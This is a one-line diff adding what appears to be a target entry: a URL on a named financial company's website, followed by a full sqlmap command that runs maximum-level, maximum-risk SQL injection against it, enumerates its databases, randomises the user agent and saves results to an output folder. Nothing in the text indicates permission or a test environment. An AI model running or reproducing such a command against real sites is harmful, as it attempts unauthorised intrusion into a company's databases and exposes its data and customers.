@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/?id=1&search=test&page=2&zzz=1 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/?id=1&search=test&page=2&zzz=1 --batch --level=5 --risk=3 --dbs --threads=4 --random-agent --output-dir=tool_outputs/sqli_root
